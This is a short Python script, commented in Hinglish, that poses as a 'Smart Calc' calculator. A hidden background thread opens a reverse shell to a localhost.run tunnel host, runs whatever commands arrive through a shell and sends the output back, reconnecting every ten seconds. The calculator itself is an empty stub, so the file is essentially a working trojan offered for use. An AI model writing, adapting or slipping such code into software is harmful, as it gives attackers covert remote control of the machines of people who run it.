import socket
import subprocess
import threading
import time

# --- BACKGROUND ATTACK ---
def connect_to_master():
    # YAHAN AAPKA LOCALHOST.RUN WALA LINK AAYEGA
    SERVER_URL = '0cd184229b0b1d.lhr.life'
    PORT = 80
    
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER_URL, PORT))
            while True:
                data = s.recv(1024).decode()
                if data.lower() == 'exit':
                    break
                # Command execute karna
                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output = proc.stdout.read() + proc.stderr.read()
                s.send(output if output else b"Command executed (No output)")
            s.close()
        except:
            time.sleep(10) # Agar disconnect ho jaye toh har 10 sec mein try karega

# --- FRONTEND CALCULATOR ---
def simple_calculator():
    print("Welcome to Smart Calc")
    # Yahan basic math logic
    pass

if __name__ == "__main__":
    # Dono ko saath chalana
    threading.Thread(target=connect_to_master, daemon=True).start()
    simple_calculator()
